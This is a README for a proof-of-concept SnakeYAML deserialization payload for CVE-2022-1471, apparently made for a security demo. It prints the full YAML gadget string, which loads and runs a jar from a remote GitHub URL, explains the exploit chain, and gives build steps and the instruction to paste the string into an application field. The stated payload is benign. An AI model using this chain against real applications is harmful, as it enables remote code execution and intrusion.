# yaml-payload

A SnakeYAML deserialization exploit payload for **CVE-2022-1471**, adapted from [artsploit/yaml-payload](https://github.com/artsploit/yaml-payload) (originally based on [mbechler/marshalsec](https://github.com/mbechler/marshalsec)).

## What it does

When loaded via SnakeYAML's unsafe `Yaml.load()`, this payload:

1. **Spins up an embedded HTTP server** on port 9999 serving a "You've Been PWNED" page
2. **Opens the browser** automatically (macOS, Linux, and Windows)
3. **Prints exploit evidence** to the console/CI logs

This works both **locally on macOS** and in **CI/CD pipelines** (e.g. GitHub Actions on Ubuntu) — on headless Linux, the HTTP server still starts and the console output proves RCE, even without a display.

## How the exploit chain works

The SnakeYAML payload triggers `ScriptEngineManager` via the Java SPI (Service Provider Interface):

```
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://raw.githubusercontent.com/seal-sec-demo-2/yaml-payload/main/yaml-payload.jar"]]]]
```

1. SnakeYAML instantiates `java.net.URL` pointing to this repo's `yaml-payload.jar`
2. Wraps it in a `URLClassLoader` to load remote classes
3. `ScriptEngineManager` discovers and loads `AwesomeScriptEngineFactory` via `META-INF/services/javax.script.ScriptEngineFactory`
4. The factory's constructor runs arbitrary code — starting the PWNED HTTP server

## Build

Requires JDK 17+:

```bash
javac -d build src/artsploit/AwesomeScriptEngineFactory.java
cp -r src/META-INF build/
cd build && jar -cfv ../yaml-payload.jar . && cd ..
```

## Usage

Used as the exploit payload in the [maven-demo](https://github.com/seal-sec-demo-2/maven-demo) project. Paste the payload string into the app's name field to trigger RCE. See that repo's README for full demo instructions.
